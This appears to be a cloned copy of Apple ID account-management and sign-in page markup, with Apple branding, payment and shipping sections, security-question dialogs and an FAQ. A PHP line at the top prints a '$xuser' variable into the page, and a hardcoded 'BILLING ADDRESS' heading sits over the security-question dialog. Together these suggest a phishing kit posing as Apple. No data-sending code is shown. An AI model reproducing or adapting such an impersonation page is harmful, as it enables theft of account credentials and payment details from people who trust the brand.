    <div class="pin-tip force-ltr"><?php print "$xuser"; ?>
    </div>
</div>
</string-ellipsis>
            </div>
            
        
    </div>
</section>

</rescue-email-view>
                                    </div>
                                </div>
                            
                                    
                                    <div class="col-sm-5">
                                        <div class="flow-subsection">
                                            <twostepenroll add-trusted="{addTrusted}" config="{config}" account="{account}">


<h3 id="twoStepLabel" class="section-subtitle">TWO-STEP VERIFICATION</h3>
<div aria-describedby="twoStepLabel" role="group" class="detail">
        <div tabindex="-1" id="twoStepEnrollDescription" class="body-text no-outline">Add an extra layer of security to your account.</div>
        <div class="pop-wrapper modal-wrapper">
            <button tabindex="-1" class="btn btn-link two-step-enroll">Get Started...</button>
        </div>
</div>

</twostepenroll>
                                        </div>
                                    </div>

                                
                        </div></div>
                
            
    </div>
</div>
</accordion>
        </div>
    </div>
</section>

</msecurity>
                <devices config="{config}" account="{account}">


<section class="flow-section mobile-only non-edit clearfix" id="devicesNonEdit">
    <div class="row">
        <div class="col-md-3 section-name">
            <div class="section-action">
                <button tabindex="-1" aria-controls="devices-content" class="btn btn-link section-title">
                    Devices
                </button>
            </div>
        </div>
    </div>
</section>

<section class="flow-section mobile-section-edit  edit   clearfix" id="devices">
    <div class="row">
        <div id="heading-devices" class="col-md-3 section-name">
            <h2 class="not-mobile section-title break-section-title">
                Devices
            </h2>
                <div class="mobile-only section-title">
                    <button tabindex="-1" class="btn btn-link btn-overlay btn-back"> Back </button>
                    <h2 class="wrap-popover-title">
                        Security
                    </h2>
                </div>
            
        </div>
        <div aria-labelledby="heading-devices" id="devices-content" class="col-md-9 subsection">
                <div class="flow-subsection">
                    <div class="row">
                        <div class="col-sm-10">
                            <h3 class="section-subtitle">
                                Security
                            </h3>
                            <div class="detail about-devices">
                                <button tabindex="-1" class="btn btn-link view-devices">
                                    View Details
                                </button>
                            </div>
                        </div>
                    </div>
                </div>            
        </div>
    </div>
</section>


</devices>
            
                <aid-payment {(config)}="config" {shipping-addresses}="account.person.shippingAddresses" {has-family-card}="hasFamilyCard" {is-underage-with-payment}="isUnderAgeAndHasFamilyPaymentMethod" {payment-status}="account.paymentMethodStatus" {(account)}="account">



<div id="paymentVerificationContainer"></div>
<section class="flow-section mobile-only non-edit clearfix" id="paymentNonEdit">
    <div class="row">
        <div class="col-md-3 section-name">
            <div class="section-action" id="payment-header">
                <button tabindex="-1" aria-controls="payment-content" ($click)="openMobileView()" class="btn btn-link section-title">
                    Payment
                </button>
            </div>
        </div>
    </div>
</section>

<section class="flow-section mobile-section closed " id="payment">
    <div class="payment-wrapper">
        <div class="mobile-only">
            
            
            <idms-toolbar (cancelclicked)="closeMobileView" class="mobile-only" section-title="Payment" cancel-button-text="Back">


<div class="section-title wrap-section-title">
    <button tabindex="-1" role="button" ($click)="clicked('cancelClicked')" class="btn btn-link btn-overlay btn-cancel btn-left">Back</button>
    
    <h2 class="wrap-popover-title toolbar-title">Payment</h2>

         
    
</div>
</idms-toolbar>

        </div>

        <div class="row">
              <div class="not-mobile col-md-3 section-name">
                <h2 class="section-title break-section-title">
                    Payment & Shipping
                </h2>
            </div>

            <div id="payment-content" class="col-md-9 subsection">
                <accordion delay="0.4" {edit}="editMode">


<div class="accordion-fade ">
    <div class="accordion-fade acdn-edit">
    </div>
    <div class="accordion-fade acdn-nonedit">
            
                        
                        <div class="row view-mode"> 
                            <div class="col-xs-12 col-sm-5">
                                <h3 class="section-subtitle not-mobile">PAYMENT METHOD</h3>

                                
                                <h3 class="section-subtitle mobile-only">PAYMENT METHOD</h3>
                                <div class="payment-method-view account"> 
                                    <div class="detail"><button tabindex="-1" ($click)="openEdit('payment-method')" class="btn btn-link add-card acdn-btn-edit">Add a Card...</button></div>
                                    <div class="col-sm-3 col-md-6 mobile-only">
                                        <p class="edit-description">This payment method will be used when you make purchases in the iTunes Store, App Store, Apple Online Store and more.</p>
                                    </div>
                                </div>
                            </div>
                            <div class="col-xs-12 col-sm-5">
                                    <h3 class="section-subtitle">SHIPPING ADDRESS</h3>
                                    <div class="detail">
                                        <button tabindex="-1" ($click)="openEdit('shipping-address')" class="btn btn-link acdn-btn-edit add-shipping-address">
                                            Add a Shipping address...
                                        </button>
                                    </div>
                                <div class="detail mobile-only">
                                    <p class="edit-description">
                                        The shipping address will be used when you make Apple Store purchases.
                                    </p>
                                </div>
                            </div>
                        </div>
                    
                
    </div>
</div>
</accordion>
            </div>
        </div>
    </div>
</section>


</aid-payment>
            <preferences config="{config}" account="{account}">


<section class="flow-section newsletters mobile-only non-edit" id="newslettersNonEdit">
    <div class="row">
            <div id="heading-newsletters" class="col-md-3 section-name">
                <div class="section-action">
                    <button tabindex="-1" aria-controls="newsletters-content" class="btn btn-link section-title">
                        Newsletters
                    </button>
                </div>
            </div>
    </div>
</section>


<section class="flow-section mobile-section-edit newsletters non-edit " id="newsletters">
    <div class="row">
            <div id="heading-newsletters" class="col-md-3 section-name">
                <h2 class="not-mobile section-title break-section-title">
                    Newsletters
                </h2>
                <div class="section-action">
                    <button tabindex="-1" aria-controls="newsletters-content" class="btn btn-link section-title">
                        Newsletters
                    </button>
                </div>
            </div>
            <div aria-labelledby="heading-newsletters" id="newsletters-content" class="col-md-9 subsection">
                <div class="row">
                    <div class="col-sm-6">
                        <h3 class="section-subtitle language-subtitle">LANGUAGE</h3>
                        <div class="form-group clearfix">
                            <div class="select-wrapper">
                                <label for="lang" class="sr-only">Choose country</label>
                                <select tabindex="-1" class="form-control select-country" can-value="account.preferences.preferredLanguage" type="text" id="lang">
                                        <option value="id_ID">Bahasa Indonesia - Indonesian</option>
                                        <option value="ms_MY">Bahasa Melayu - Malay</option>
                                        <option value="ca_ES">Català - Catalan</option>
                                        <option value="cs_CZ">Cetina - Czech</option>
                                        <option value="da_DK">Dansk - Danish</option>
                                        <option value="de_DE">Deutsch - German</option>
                                        <option value="de_CH">Deutsch (Schweiz) - German (Switzerland)</option>
                                        <option value="en_UK">English (UK) - English (UK)</option>
                                        <option value="en_US">English (US) - English (US)</option>
                                        <option value="es_ES">Español - Spanish</option>
                                        <option value="es_MX">Español (Latinoamérica) - Spanish (Latin America)</option>
                                        <option value="fr_FR">Français - French</option>
                                        <option value="fr_CA">Français (Canada) - French (Canada)</option>
                                        <option value="hr_HR">Hrvatski - Croatian</option>
                                        <option value="it_IT">Italiano - Italian</option>
                                        <option value="hu_HU">Magyar - Hungarian</option>
                                        <option value="nl_NL">Nederlands - Dutch</option>
                                        <option value="no_NO">Norsk - Norwegian</option>
                                        <option value="pl_PL">Polski - Polish</option>
                                        <option value="pt_BR">Português (Brasil) - Portuguese (Brazil)</option>
                                        <option value="pt_PT">Português (Portugal) - Portuguese (Portugal)</option>
                                        <option value="ro_RO">Româna - Romanian</option>
                                        <option value="sk_SK">Slovencina - Slovak</option>
                                        <option value="fi_FI">Suomi - Finnish</option>
                                        <option value="sv_SE">Svenska - Swedish</option>
                                        <option value="vi_VN">Ti?ng Vi?t - Vietnamese</option>
                                        <option value="tr_TR">Türkçe - Turkish</option>
                                        <option value="el_GR">???????? - Greek</option>
                                        <option value="ru_RU">??????? - Russian</option>
                                        <option value="uk_UA">?????????? - Ukrainian</option>
                                        <option value="iw_IL">????? - Hebrew</option>
                                        <option value="ar_SA">??????? - Arabic</option>
                                        <option value="hi_IN">?????? - Hindi</option>
                                        <option value="th_TH">??????? - Thai</option>
                                        <option value="ko_KR">??? - Korean</option>
                                        <option value="ja_JP">??? - Japanese</option>
                                        <option value="zh_CN">???? - Chinese (Simplified)</option>
                                        <option value="zh_TW">???? - Chinese (Traditional)</option>
                                </select>
                            </div>
                        </div>
                    </div>
                </div>
                <div class="row checkbox-row">
                    <div class="col-sm-12">
                        <h3 class="section-subtitle">EMAIL FROM APPLE</h3>
                            <div class="checkbox">
                                <input tabindex="-1" can-value="account.preferences.marketingPreferences.appleUpdates" checked="checked" name="news" id="news" type="checkbox">
                                <label for="news">
                                    Announcements <small class="label-small">Get announcements, recommendations and updates about Apple products, services, software updates and more.</small>
                                </label>
                            </div>

                            <div class="checkbox">
                                <input tabindex="-1" can-value="account.preferences.marketingPreferences.iTunesUpdates" checked="" name="itunes" id="itunes" type="checkbox">
                                <label for="itunes">
                                    Apple Music, iTunes, iBooks, and App Store Offers <small class="label-small">Get recommendations, the latest releases, special offers and exclusive content for music, apps, movies, TV, books, podcasts and more.</small>
                                </label>
                            </div>
                                <div class="checkbox">
                                    <input tabindex="-1" can-value="account.preferences.marketingPreferences.appleNews" checked="" name="appleNews" id="appleNews" type="checkbox">
                                    <label for="appleNews">
                                        Apple News Updates <small class="label-small">Get the best stories and recommendations from Apple News delivered directly to your inbox.</small>
                                    </label>
                                </div>
                        
                    </div>
                </div>
            </div>        
    </div>
</section>

</preferences>
            <div class="flow-section signout-list" id="signout">
                <div class="row">
                    <div class="col-sm-12 section-name">
                        <div class="section-action">
                            <button tabindex="-1" class="btn btn-link section-title">
                                Sign Out
                            </button>
                        </div>
                    </div>
                </div>
            </div>
            <support config="{config}" account="{account}">


<section class="flow-section support" id="support">
    <div class="row">
        <div class="col-md-6 section-name">
            <button tabindex="-1" class="btn btn-link support-pin">
                </span><span class="btn-txt">Support PIN</span>
            </button>
        </div>
    </div>
</section>

</support>
        </div>


    <footer>



<div class="container">
    <div class="footer">
        <div class="footer-wrap">
            <div class="line1">
                <div class="line-level">Shop the <a tabindex="-1" title="Apple Online Store" href="http://store.apple.com/uk">Apple Online Store</a> (0800 048 0408), visit an <a tabindex="-1" title="Apple Retail Store" href="http://www.apple.com/retail/">Apple Retail Store</a>, or find a <a tabindex="-1" title="Reseller" href="http://www.apple.com/buy/">reseller</a>.</div>
            </div>
            <div class="line2">
                <ul class="menu">
                    <li class="item"><a tabindex="-1" target="_blank" title="Apple Info" href="http://www.apple.com/about/">Apple Info</a></li>
                    <li class="item"><a tabindex="-1" target="_blank" title="Site Map" href="http://www.apple.com/sitemap/">Site Map</a></li>
                    <li class="item"><a tabindex="-1" target="_blank" title="Hot News" href="http://www.apple.com/hotnews/">Hot News</a></li>
                    <li class="item"><a tabindex="-1" target="_blank" title="RSS Feeds" href="http://www.apple.com/rss/">RSS Feeds</a></li>
                    <li class="item"><a tabindex="-1" target="_blank" title="Contact Us" href="">Contact Us</a></li>
                    <li class="item">
                        <a tabindex="-1" href="" title="Choose your country or region" class="choose">
                        <img alt="Australia" src="https://appleid.cdn-apple.com/static/bin/cb3412482741/images/countryFooterFlags/22x22/AUSflag.png" width="22" height="22">
                        </a>
                    </li>
                </ul>
            </div>
            <div class="line3">
                Copyright © 2017 Apple Inc. All rights reserved.
                <ul class="menu">
                    <li class="item"><a tabindex="-1" title="Terms of Use" href="http://www.apple.com/legal/terms/site.html">Terms of Use</a></li>
                    <li class="item"><a tabindex="-1" title="Privacy Policy" href="http://www.apple.com/privacy/privacy-policy/">Privacy Policy</a></li>
                </ul>
            </div>
        </div>
    </div>
</div>
</footer>
</div>

</manage></div>
<div id="unauthdata">

    



<script type="text/stache" id="jstache_951058190">


<div class="app-container">
    {{#eq page 'signin'}}
        {{#showBanner}}
            
        {{/showBanner}}
    {{/if}}
    <applenav></applenav>
    <subnav page="{page}"></subnav>
    <hero page="{page}"></hero>
    <div id="flow">
        {{#eq page "create"}}
            <create page="{page}"></create>
        {{else}}
            {{#eq page "faq"}}
                <faq page="{page}"></faq>
            {{else}}
                <signin page="{page}"></signin>
            {{/if}}
        {{/if}}
    </div>
    <footer></footer>
</div>



</script>
<script type="text/stache" id="jstache_263695741">


<div class="modal flow-dialog default-dialog challenge-dialog" id="challengeID">
    <div class="modal-dialog">
        <div class="modal-content" role="dialog" aria-labelledby="challengeTitleHeader" tabindex="-1">
            <div class="modal-body-wrapper">
                {{^resetQuestions}
                {{^showSupport}}
                    <div class="modal-body">
                        <div class="row challenge-row">
                            <div class="col-sm-12 exclude-padding">
                                <div class="modal-header">
                                    <h2 id="challengeTitleHeader" class="modal-title">
                                        BILLING ADDRESS                                    </h2>
                                    <h4 class="modal-title">

                                    </h4>
                                </div>
                                <div class="challenges">
                                    <div class="form-group clearfix">
                                        <label for="answer1" class="challenge-label body-text">{{ question1 }}</label>
                                        <div class="row answer1-row no-intendation">
                                            <div class="col-sm-8 input-wrapper">
                                                <div class="pop-wrapper field-pop-wrapper field-wrapper field-answer">
                                                    <input type="text" id="answer1" name="answer1"
                                                           class="form-control field{{#if errors.answer1.hasErrors}} error has-errors{{/if}}"
                                                           placeholder="answer"
                                                           can-value="{answer1}"
                                                           autocorrect="off"
                                                           autocapitalize="off"
                                                           autocomplete="off"
                                                           spellcheck="false" />

                                                    {{#errors.answer1.showError}}
                                                        <div class="errorPop-body popover" role="tooltip">
                                                            <div class="errorPop-arrow arrow"></div>
                                                            <div class="errorPop-content popover-content">
                                                                {{errors.answer1.main.message}}
                                                            </div>
                                                        </div>
                                                    {{/if}}
                                                </div>
                                            </div>
                                        </div>
                                    </div>
                                    <div class="form-group form-answer2 clearfix">
                                        <label for="answer2" class="challenge-label body-text">{{ question2 }}</label>
                                        <div class="row answer2-row no-intendation">
                                            <div class="col-sm-8 input-wrapper">
                                                <div class="pop-wrapper field-pop-wrapper field-wrapper field-answer">
                                                    <input type="text" id="answer2" name="answer2"
                                                           class="form-control field{{#if errors.answer1.hasErrors}} error has-errors{{/if}}"
                                                           placeholder="answer"
                                                           can-value="{answer2}"
                                                           autocorrect="off"
                                                           autocapitalize="off"
                                                           autocomplete="off"
                                                           spellcheck="false" />

                                                    {{#errors.answer2.showError}}
                                                        <div class="errorPop-body popover" role="tooltip">
                                                            <div class="errorPop-arrow arrow"></div>
                                                            <div class="errorPop-content popover-content">
                                                                {{errors.answer2.main.message}}
                                                            </div>
                                                        </div>
                                                    {{/if}}
                                                </div>
                                            </div>
                                        </div>
                                    </div>
                                </div>
                            </div>
                        </div>

                <div class="modal-footer">
                    <div class="btn-group flow-controls pull-right">
                        <loading loading="{challengeLoading}"></loading>
                        <button class="btn btn-link first back">Cancel</button>
                        <button class="btn btn-link last continue"{{^continueEnabled}} disabled{{/if}}>
                        Continue
                        </button>
                    </div>
                </div>
            {{else}}
                <supportpin account="{account}" config="{config}"></supportpin>
            {{/showSupport}}
            {{else}}
                <div class="modal-body">
                    <div class="row">
                        <div class="col-sm-12 exclude-padding">
                            <div class="modal-header exclude-margin">
                                <h4 class="modal-title">
                                    Reset Instructions Sent

                                    <small>
                                        An email with instructions has been sent to <span class="bold graceful-wrap">{{account.security.rescueEmail}}</span>. Follow the directions in the email to reset your security questions.
                                    </small>
                                </h4>
                            </div>
                        </div>
                    </div>
                </div>
                <div class="modal-footer">
                    <div class="btn-group flow-controls pull-right">
                        <button class="btn btn-link back ok-button">OK</button>
                    </div>
                </div>
            {{/resetQuestions}}
        </div>
    </div>
</div>
</script>
<script type="text/stache" id="jstache_1563256347">


<div class="modal fade flow-dialog default-dialog cr-locked-modal" id="crLockedModal" data-backdrop="static">
    <div class="modal-dialog">
        <div class="modal-content" role="dialog" aria-labelledby="crLockedModalLabel" tabindex="-1">
        {{#if resetSecurityQuestions}}
            <div class="modal-body">
                <div class="row">
                    <div class="col-sm-2 not-mobile">
                        <img src="https://appleid.cdn-apple.com/static/bin/cb2442680439/dist/assets/images/alert_icon.png" alt="Alert icon" width="60" class="alert-icon" />
                    </div>
                    <div class="col-sm-10 exclude-padding">
                        <div class="modal-header">
                            <h4 class="modal-title" id="crLockedModalLabel">Reset Instructions Sent</h4>
                        </div>
                        <div class="modal-body-content">
                            <span class="body-text">
                                An email with instructions has been sent to <span class="graceful-wrap">{{accountRescueEmail}}</span>. Follow the directions in the email to reset your security questions.
                            </span>
                        </div>
                    </div>
                </div>
            </div>
            <div class="modal-footer">
                <div class="btn-group flow-controls pull-right">
                    <button type="button" class="btn btn-link ok" data-dismiss="modal">OK</button>
                </div>
            </div>
        {{else}}
            <div class="modal-body">
                <div class="row">
                    <div class="col-sm-2 not-mobile">
                        <img src="https://appleid.cdn-apple.com/static/bin/cb2442680439/dist/assets/images/alert_icon.png" alt="Alert icon" width="60" class="alert-icon" />
                    </div>
                    <div class="col-sm-10 exclude-padding">
                        <div class="modal-header">
                            <h4 class="modal-title" id="crLockedModalLabel">Too many incorrect verification attempts</h4>
                        </div>
                        <div class="modal-body-content">
                            <span class="body-text">
                                {{#account.security.rescueEmail}}
                                    You have made too many attempts to answer your security questions. You can try again later or use your rescue email address to reset your security information.
                                {{else}}
                                    You have made too many attempts to answer your security questions.
                                {{/if}}
                            </span>
                        </div>
                    </div>
                </div>
            </div>
            <div class="modal-footer">
                <div class="btn-group flow-controls pull-right">
                    <button type="button" class="btn btn-link{{#if account.security.rescueEmail}} first{{/if}} cancel" data-dismiss="modal">{{#if account.security.rescueEmail}}Cancel{{else}}OK{{/if}}</button>
                    {{#if account.security.rescueEmail}}
                    <button type="button" class="btn btn-link last not-mobile reset-questions">Add Rescue Email Address</button>
                    <button type="button" class="btn btn-link last mobile-only reset-questions">Add Rescue Email</button>
                    {{/if}}
                </div>
            </div>
        {{/if}}
        </div>
    </div>
</div>

</script>
<script type="text/stache" id="jstache_218329818">


<div class="modal fade flow-dialog default-dialog timeout-modal" id="timeoutModal" data-backdrop="static">
    <div class="modal-dialog">
        <div class="modal-content" role="dialog" aria-labelledby="timeoutModalTitle" tabindex="-1">
            <div class="modal-body">
            	<div class="row timeout-row">
            		<div class="col-sm-2 not-mobile">
            			<img src="https://appleid.cdn-apple.com/static/bin/cb2442680439/dist/assets/images/alert_icon.png" height="60" alt="alert icon" width="60" class="alert-icon" />
            		</div>
            		<div class="col-sm-10 exclude-padding content">
                		<div class="modal-header">
                    		<h4 class="modal-title" id="timeoutModalTitle">
                        		Are you still there?
                    		</h4>
                		</div>
                		<div class="modal-body-content exclude-padding">
                    		<p class="body-text">To protect your privacy, this session will time out in {{ duration }} seconds. If the session expires, you will need to start again.</p>
                    	</div>
                	</div>
                </div>
            </div>

            <div class="modal-footer clearfix">
                <div class="btn-group flow-controls pull-right">
                    <loading loading="{continueLoading}"></loading>
                    <button type="button" class="btn btn-link first sign-out">
                        Sign Out
                    </button>
                    <button type="button" class="btn btn-link last continue">
                        Continue
                    </button>
                </div>
            </div>
        </div>
    </div>
</div>
</script>
<script type="text/stache" id="jstache_2017631801">


<div class="subnav{{#if state.manage}} manage{{/if}}">
    <div class="container">
        <div class="title pull-left">Apple ID</div>
        <div class="menu-wrapper pull-right">
            <ul class="menu">
                <li class="item{{#eq page 'signin'}} active{{/if}}">
                    <a href="/" class="btn btn-link btn-signin" title="Sign In">Sign In</a>
                </li>
                <li class="item {{#eq page 'create'}} active{{/if}}">
                    <a href="/account" class="btn btn-link btn-create" title="Create Your Apple ID">Create Your Apple ID</a>
                </li>
                <li class="item{{#eq page 'faq'}} active{{/if}}">
                    <a href="/faq" class="btn btn-link btn-faq" title="Frequently Asked Questions">FAQ</a>
                </li>
            </ul>
        </div>
    </div>
</div>
</script>
<script type="text/stache" id="jstache_1849662777">



<div class="container">
    <div class="footer">
        <div class="footer-wrap">
            <div class="line1">
                <div class="line-level">Shop the <a href="http://store.apple.com/uk" title="Apple Online Store">Apple Online Store</a> (0800 048 0408), visit an <a href="http://www.apple.com/retail/" title="Apple Retail Store">Apple Retail Store</a>, or find a <a href="http://www.apple.com/buy/" title="Reseller">reseller</a>.</div>
            </div>
            <div class="line2">
                <ul class="menu">
                    <li class="item"><a href="http://www.apple.com/about/" title="Apple Info" target="_blank">Apple Info</a></li>
                    <li class="item"><a href="http://www.apple.com/sitemap/" title="Site Map" target="_blank">Site Map</a></li>
                    <li class="item"><a href="http://www.apple.com/hotnews/" title="Hot News" target="_blank">Hot News</a></li>
                    <li class="item"><a href="http://www.apple.com/rss/" title="RSS Feeds" target="_blank">RSS Feeds</a></li>
                    <li class="item"><a href="http://www.apple.com/contact/" title="Contact Us" target="_blank">Contact Us</a></li>
                    <li class="item">
                        <a class="choose" title="Choose your country or region" href="">
                        <img src="https://appleid.cdn-apple.com/static/bin/cb3412482741/images/countryFooterFlags/22x22/AUSflag.png" height="22" alt="Australia" width="22" />
                        </a>
                    </li>
                </ul>
            </div>
            <div class="line3">
                Copyright © 2017 Apple Inc. All rights reserved.
                <ul class="menu">
                    <li class="item"><a href="http://www.apple.com/legal/terms/site.html" title="Terms of Use">Terms of Use</a></li>
                    <li class="item"><a href="http://www.apple.com/privacy/privacy-policy/" title="Privacy Policy">Privacy Policy</a></li>
                </ul>
            </div>
        </div>
    </div>
</div>
</script>
<script type="text/stache" id="jstache_436898570">


<div class="hero{{#eq page 'signin'}} signin{{/if}}{{^page}} signin{{/if}}{{#eq page 'manage'}} manage{{/if}}">
    {{#eq page "create"}}
        <div class="container">
            <h1>Create Your Apple ID</h1>
        </div>
    {{else}}
        {{#eq page "faq"}}
            <div class="container">
                <h1>Frequently Asked Questions</h1>
            </div>
        {{else}}
            <h1 class="sr-only">Apple ID</h1>
            <landing></landing>
        {{/if}}
    {{/if}}
</div>

</script>
<script type="text/stache" id="jstache_215916042">


{{#bannerMessage}}
<div class="row alert notice-wrapper">
  <div class="col-xs-12">
    <div class="notice">
      <div class="alert-content">
        <a href="#" data-dismiss="alert" class="alert-close" aria-label="close" title="close">×</a>
        {{bannerMessage}}
      </div>
    </div>
  </div>
</div>
{{/bannerMessage}}

</script>
<script type="text/stache" id="jstache_86504118">


<div class="flow-body signin clearfix" role="main">
    <div class="container">
        <div id="forgot-link" class="forgot">
            <a href="{{iForgotLinkUrl}}" title='{{iforgotLinkTitle}}' role="link">Forgot Apple ID or password?</a>
        </div>
        <div class="flex home-content">
            <h2 class="title separator">Your account for everything Apple.</h2>
            <div class="intro-signin">A single Apple ID and password gives you access to all Apple services.</div>
            <div class="intro-signin">
                
                <a class="button faq-link" href="/faq" title="Learn more about Apple ID">
                    Learn more about Apple ID <i class="icon icon_right_chevron"></i>
                </a>
            </div>
            
            <div class="apps text-center">
                {{#is deviceRatio 1}}
                    <div class="app-icons-1x" title="Apple Apps and Services: iCloud, App Store, iTunes, iBooks, Messages, FaceTime, Apple Store, Game Centre."></div>
                {{else}}
                    <div class="app-icons-2x" title="Apple Apps and Services: iCloud, App Store, iTunes, iBooks, Messages, FaceTime, Apple Store, Game Centre."></div>
                {{/is}}
            </div>
            <div class="mobile-apps text-center mobile-only">
                {{#is deviceRatio 1}}
                    <div class="mobile-icons-1x" title="Apple Apps and Services: iCloud, App Store, iTunes, iBooks, Messages, FaceTime, Apple Store, Game Centre."></div>
                {{else}}
                    <div class="mobile-icons-2x" title="Apple Apps and Services: iCloud, App Store, iTunes, iBooks, Messages, FaceTime, Apple Store, Game Centre."></div>
                {{/is}}
            </div>
            <div class="intro-signin create show">
                
                <a class="button create-link" href="/account" title='Create your Apple ID'>Create your Apple ID<i class="icon icon_right_chevron"></i></a>
            </div>
        </div>
    </div>
</div>

</script>
<script type="text/stache" id="jstache_655649672">


<div class="flow-body faq clearfix" role="main">
    <div class="container">
        <div class="faq-item">
            <h6 class="question">What is an Apple ID?</h6>
            <p class="answer">An Apple ID is the personal account you use to access Apple services like the App Store, iTunes Store, iCloud, iMessage, the Apple Online Store, FaceTime and more. It includes the email address and password you use to sign in, as well as all the contact, payment and security details that you will use across Apple services.</p>
        </div>
        <div class="faq-item">
            <h6 class="question">When do I use my Apple ID?</h6>
            <p class="answer">Any time you set up a new device, make a purchase or use any Apple service, you will be asked to sign in with your Apple ID and password. Once signed in, you will have access to the service and all the personal information in your account.</p>
        </div>
        <div class="faq-item">
            <h6 class="question">How many Apple IDs do I need?</h6>
            <p class="answer">Just one. Use the same Apple ID everywhere you sign in to ensure that all your Apple services and devices work together seamlessly and you can access your personal content from all your devices.</p>
        </div>
        <div class="faq-item">
            <h6 class="question">Can I share an Apple ID with someone else?</h6>
            <p class="answer">Your Apple ID should not be shared with anyone else. It provides access to personal information including contacts, photos, device backups and more. Sharing your Apple ID with someone else means you are giving them access to all of your personal content and may lead to confusion over who actually owns the account. To share iTunes & App Store purchases, photos, a calendar and more with someone else, try <a href="https://support.apple.com/HT201060" target="_blank" title="Family Sharing">Family Sharing</a>, <a href="https://support.apple.com/HT202786" target="_blank" title="iCloud Photo Sharing">iCloud Photo Sharing</a> or other easy-to-use sharing features.</p>
        </div>
        <div class="faq-item">
            <h6 class="question">How can I keep my Apple ID secure?</h6>
            <p class="answer">Security and privacy are very important to Apple and we provide a number of ways to secure your Apple ID and protect your privacy including strong passwords, two-step verification and more. Learn more about <a href="https://support.apple.com/HT201303" target="_blank" title="Apple ID and Security">Apple ID and Security</a>.</p>
        </div>
        <p class="info">For more information or help, <a href="https://www.apple.com/uk/support/appleid/" target="_blank" title="Apple Support">visit Apple Support</a>.</p>
    </div>
</div>
</script>
<script type="text/stache" id="jstache_1926855381">


<div class="flow-body create-body clearfix" role="main">
    <div class="intro">
        <div class="intro-text">One Apple ID is all you need to access all Apple services.</div>
        <div class="intro-link">Already have an Apple ID? <a href="{{config.findAppleIdUrl}}" title="iForgot" target="_blank">Find it here <i class="icon icon_right_chevron"></i></a></div>
    </div>
    <div class="container personal-wrapper">
        <personal account="{account}" validator="{validator}" fieldmap="{fieldmap}" config="{config}"/>
    </div>
    <div class="container recovery-wrapper">
        <recovery account="{account}" validator="{validator}" fieldmap="{fieldmap}" config="{config}"/>
    </div>
    {{#hasScnt}}
        <div class="container security-wrapper">
            <security account="{account}" state="{state}" config="{config}" verify="{verify}" validator="{validator}" fieldmap="{fieldmap}"/>
        </div>
    {{/if}}
</div>
<div class="container">
    <div class="flow-footer create-footer clearfix">
        <div class="flow-controls">
            <loading loading="{verifyLoading}"></loading>
            <button class="btn btn-link verify">Continue</button>
        </div>
    </div>
</div>

<div class="modal default-dialog create-modal" id="verification" tabindex="-1" role="dialog" aria-labelledby="verificationLabel" aria-hidden="true" data-backdrop="static" data-keyboard="false">
    <div class="modal-dialog">
        <div class="modal-content">
            <mverify account="{account}" verify="{verify}" email="{account.account.name}" show-verify-modal="{showVerifyModal}" />
        </div>
    </div>
</div>

</script>
<script type="text/stache" id="jstache_1762873625">


<div class="loading">
  <i class="icon {{#loading}} icon_process rotate{{/loading}}{{#success}} icon_checkmark success{{/success}}{{#fail}} icon_alert fail{{/fail}} spinner"></i>
</div>
</script>
<script type="text/stache" id="jstache_2017864454">


<div id="auth-container" class="si-frame">
</div>

</script>
<script type="text/stache" id="jstache_1323885800">


<section class="flow-section personal">
    <div class="container container-xs">
        <div class="email">
            <aid-account-name validator="{validator}" name="{account.account.name}"></aid-account-name>
            <aid-password validator="{validator}" password="{account.account.password}" name="{account.account.name}"/>
        </div>
        <div class="person clearfix">
            <aid-name validator="{validator}" nameorder="{config.pageFeatures.nameOrder}" firstname="{account.account.person.name.firstName}" lastname="{account.account.person.name.lastName}"></aid-name>
            <aid-birthday account="{account}" validator="{validator}" birthday="{account.account.person.birthday}" />
        </div>
        {{#showExtraDOBTextJobs}}
            <div class="info info-second jobs-text">
                Date of birth will not be shared with our recruiting team.
            </div>
        {{/showExtraDOBTextJobs}}
    </div>
</section>

</script>
<script type="text/stache" id="jstache_306037992">


<section class="flow-section security">
    <div class="container container-xs">
        <aid-preferences account="{account}" config="{config}"></aid-preferences>
        <div class="security">
            <captcha state="{state}" verify="{verify}" validator="{validator}" fieldmap="{fieldmap}"/>
            
            <div class="privacy">Apple is committed to protecting your privacy. <a href="https://www.apple.com/privacy/" target="_blank" title="Learn More">Learn more...</a></div>
        </div>
    </div>
</section>
</script>
<script type="text/stache" id="jstache_1991370552">


<div class="modal-body">
    <div class="container container-xs">
        <div class="verify-header">
            <i class="icon icon_mail"></i>
            <h4 class="title verify-title">Verify your email address to create your new Apple ID.</h4>
        </div>
        <div class="verify-body">
            <p class="body-text">
                An email with a verification code has been sent to <span class="graceful-wrap"><strong>{{ account.account.name }}</strong></span>. Enter the code here:
            </p>

            <aid-verify-code validator="{verificationValidator}" code="{account.account.verificationInfo.answer}" did-reach-max-length="{didReachMaxLength}" show-verify-modal="{showVerifyModal}" ></aid-verify-code>

            <button class="btn btn-link verify-resend" data-toggle="tooltip" data-placement="auto" title="Check your Junk mail folder or wait a few minutes. If youre still having trouble, you can request a new code.">Did not get an email?</button>
        </div>

    </div>
</div>
<div class="modal-footer">
    <div class="btn-group flow-controls pull-left{{#if resendLoading}} loading{{/if}}">
        <button type="button" class="btn btn-link new-code"><i class="icon icon_reload"></i>Send a new code</button>
        <loading loading="{resendLoading}"></loading>
    </div>
    <div class="btn-group flow-controls pull-right{{#if verifyLoading}} loading{{/if}}">
        <loading loading="{verifyLoading}"></loading>
        <button type="button" class="btn btn-link first cancel" data-dismiss="modal">Cancel</button>
        <button type="button" class="btn btn-link last create" {{^didReachMaxLength}} disabled{{/didReachMaxLength}}>Verify</button>
    </div>
</div>
<div id="send-new-code-error" class="hide"><strong>Too many verification emails have been sent.</strong> Enter the verification code from your latest email or try again later.</div>


</script>
<script type="text/stache" id="jstache_1527502152">


<section class="flow-section recovery">
    <div class="container container-xs">
        <div class="row">
            <div class="col-xs-12">
                <aid-security-questions validator="{validator}" questions="{config.localizedResources.availableSecurityQuestions}" model="{account.account.security}"/>
            </div>
            <div class="info info-second">
                These questions will be used to verify your identity and recover your password should you ever forget it.
            </div>
        </div>
    </div>
</section>
</script>
<script type="text/stache" id="jstache_1967348977">


<div class="row form-group clearfix account-name-comp">
    <div class="col-md-12 account-name-wrap center-align">
        <label for="accountName" class="sr-only">
            Email
        </label>
        <input class="form-control account-name input-sizing{{#if validator.errors.name.hasErrors}} has-errors{{/if}}" id="accountName" name="account name" type="text" placeholder="name@example.com" autocomplete='off' can-value="name" aria-required="true" />
        {{#showRecycledDomainWarning}}
        <recycled-domain-warning></recycled-domain-warning>
        {{/showRecycledDomainWarning}}
        {{#unless emailmanage}}
